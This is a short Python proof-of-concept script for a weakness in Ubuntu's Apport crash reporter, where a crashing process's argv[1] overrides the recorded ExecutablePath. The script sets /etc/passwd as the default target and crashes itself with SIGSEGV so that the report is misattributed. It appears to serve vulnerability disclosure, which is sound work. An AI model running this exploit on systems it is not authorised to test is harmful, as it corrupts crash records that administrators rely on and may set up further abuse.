#!/usr/bin/env python3
"""
PoC: Apport ExecutablePath Override via _check_interpreted()

Vulnerability: apport/report.py:_check_interpreted() (line 626-633) uses
the crashing process's ProcCmdline argv[1] to override ExecutablePath.
The only validation is os.access(path, R_OK) — no check that the path
is the actual script, a legitimate binary, or packaged.

This allows a crash report to be misattributed to an arbitrary readable
file on the system.

CWE-345: Insufficient Verification of Data Authenticity
"""

import sys
import os
import signal


def cause_crash():
    os.kill(os.getpid(), signal.SIGSEGV)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/passwd"

    print(f"[*] PID: {os.getpid()}")
    print(f"[*] argv: {sys.argv}")
    print(f"[*] argv[1] (will become ExecutablePath): {target}")
    print(f"[*] /proc/self/exe: {os.readlink('/proc/self/exe')}")
    print(f"[*] /proc/self/cmdline: {open('/proc/self/cmdline', 'rb').read()}")
    print()
    print("[*] Triggering SIGSEGV to invoke apport core_pattern handler...")
    print(f"[*] Check /var/log/apport.log and /var/crash/ after the crash")
    print()
    print(f"[*] Expected: ExecutablePath will be OVERRIDDEN to: {target}")
    print(f"[*] Real binary: {os.readlink('/proc/self/exe')}")
    print()

    cause_crash()
